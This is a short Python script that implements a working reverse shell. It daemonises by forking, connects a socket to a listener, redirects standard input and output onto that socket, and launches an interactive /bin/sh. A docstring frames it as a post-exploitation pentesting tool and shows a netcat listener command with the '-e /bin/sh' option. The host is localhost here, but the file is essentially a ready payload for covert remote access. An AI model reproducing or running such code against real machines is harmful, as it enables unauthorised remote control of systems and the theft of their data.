#!/usr/bin/python

from socket import socket
import subprocess
import os

socket_handler = socket()

try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')

socket_handler.connect(("127.0.0.1", 45679))

# Establish the connection to our socket through the command output.
os.dup2(socket_handler.fileno(), 0)
os.dup2(socket_handler.fileno(), 1)
os.dup2(socket_handler.fileno(), 2)

# Obtain the shell
shell_remote = subprocess.call(["/bin/sh", "-i"])
list_files = subprocess.call(["/bin/ls", "-i"])

"""
A reverse shell is an action by which a user gains access
to the shell of an external server. For example, if you
are working in a post-exploitation pentesting phase and
would like to create a script that is invoked in certain
scenarios that will automatically get a shell to access
the filesystem of another machine, we could build our
own reverse shell in Python.

In one terminal tab:
$ nc -lv 127.0.0.1 45679 -e /bin/sh

In another:
$ p3 reverse_shell.py

# See the nc tab open up with an sh shell
"""
